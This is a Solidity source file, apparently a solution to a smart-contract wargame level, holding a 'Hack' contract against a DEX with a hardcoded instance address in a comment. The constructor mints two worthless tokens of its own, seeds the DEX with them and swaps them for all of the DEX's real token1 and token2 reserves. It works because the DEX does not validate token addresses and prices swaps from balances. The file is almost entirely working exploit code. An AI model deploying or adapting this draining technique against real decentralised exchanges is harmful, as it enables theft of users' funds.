//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

// 0x3401F60F50127598040477Ef6AfcB24089C8d66A
contract Hack {
    IDEX2 private dex;
    MyToken private mytoken1;
    MyToken private mytoken2;

    IERC20 private immutable token1;
    IERC20 private immutable token2;

    constructor(address target) {
        dex = IDEX2(target);
        mytoken1 = new MyToken();
        mytoken2 = new MyToken();

        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());

        mytoken1.mint(2);
        mytoken2.mint(2);

        mytoken1.transfer(address(dex), 1);
        mytoken2.transfer(address(dex), 1);

        mytoken1.approve(address(dex), 1);
        mytoken2.approve(address(dex), 1);

        // amountOut = amountIn * to / from
        // 100   =  amountIn * 100 / 1
        dex.swap(address(mytoken1), address(token1), 1);
        dex.swap(address(mytoken2), address(token2), 1);

        require(token1.balanceOf(address(dex)) == 0, "token1 balance != 0");
        require(token2.balanceOf(address(dex)) == 0, "token2 balance != 0");
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDEX2 {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
}

contract MyToken is IERC20 {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(uint256 amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }
}
